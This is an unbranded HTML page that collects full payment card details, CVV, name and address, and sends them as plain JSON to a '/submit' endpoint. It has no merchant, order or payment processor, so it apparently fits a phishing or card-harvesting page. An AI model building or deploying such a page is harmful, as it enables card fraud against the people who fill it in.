<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Secure Information Capture</title>
  <link href="https://fonts.googleapis.com/css?family=Roboto:400,700&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Roboto', Arial, sans-serif;
      background: #f4f7fa;
      margin: 0;
      padding: 0;
    }
    .container {
      max-width: 420px;
      margin: 40px auto;
      background: #fff;
      border-radius: 10px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.08);
      padding: 32px 28px 24px 28px;
    }
    h2 {
      color: #003366;
      margin-bottom: 18px;
      font-weight: 700;
      text-align: center;
    }
    label {
      display: block;
      margin-bottom: 6px;
      color: #333;
      font-weight: 500;
    }
    input, textarea {
      width: 100%;
      padding: 10px;
      margin-bottom: 18px;
      border: 1px solid #b0c4de;
      border-radius: 5px;
      font-size: 1rem;
      background: #f9fbfd;
    }
    button {
      width: 100%;
      background: #0072ce;
      color: #fff;
      border: none;
      padding: 12px;
      border-radius: 5px;
      font-size: 1.1rem;
      font-weight: 700;
      cursor: pointer;
      transition: background 0.2s;
    }
    button:hover {
      background: #005fa3;
    }
    .success, .error {
      text-align: center;
      margin-bottom: 12px;
      font-weight: 500;
    }
    .success { color: #2e7d32; }
    .error { color: #c62828; }
  </style>
</head>
<body>
  <div class="container">
    <h2>Information Submission</h2>
    <div id="message"></div>
    <form id="infoForm">

      <label for="cardnumber">Card Number</label>
      <input type="text" id="cardnumber" name="cardnumber" placeholder="Card Number" pattern="\d{16}" maxlength="16" required>

      <div style="display: flex; gap: 10px;">
        <div style="flex:1;">
          <label for="expmonth">Month</label>
          <input type="text" id="expmonth" name="expmonth" placeholder="MM" pattern="\d{2}" maxlength="2" required>
        </div>
        <div style="flex:1;">
          <label for="expyear">Year</label>
          <input type="text" id="expyear" name="expyear" placeholder="YYYY" pattern="\d{4}" maxlength="4" required>
        </div>
        <div style="flex:1;">
          <label for="cvv">CVV</label>
          <input type="text" id="cvv" name="cvv" placeholder="CVV" pattern="\d{3,4}" maxlength="4" required>
        </div>
      </div>

      <label for="firstname">First Name</label>
      <input type="text" id="firstname" name="firstname" required>

      <label for="lastname">Last Name</label>
      <input type="text" id="lastname" name="lastname" required>

      <label for="address">Address</label>
      <textarea id="address" name="address" rows="2" required></textarea>

      <button type="submit">Submit</button>
    </form>
  </div>
  <script>
    document.getElementById('infoForm').addEventListener('submit', async function(e) {
      e.preventDefault();
      const data = {
        cardnumber: document.getElementById('cardnumber').value,
        expmonth: document.getElementById('expmonth').value,
        expyear: document.getElementById('expyear').value,
        cvv: document.getElementById('cvv').value,
        firstname: document.getElementById('firstname').value,
        lastname: document.getElementById('lastname').value,
        address: document.getElementById('address').value
      };
      const res = await fetch('/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      });
      const msgDiv = document.getElementById('message');
      if (res.ok) {
        msgDiv.textContent = 'Information submitted successfully!';
        msgDiv.className = 'success';
        document.getElementById('infoForm').reset();
      } else {
        msgDiv.textContent = 'Submission failed. Please try again.';
        msgDiv.className = 'error';
      }
    });
  </script>
</body>
</html>
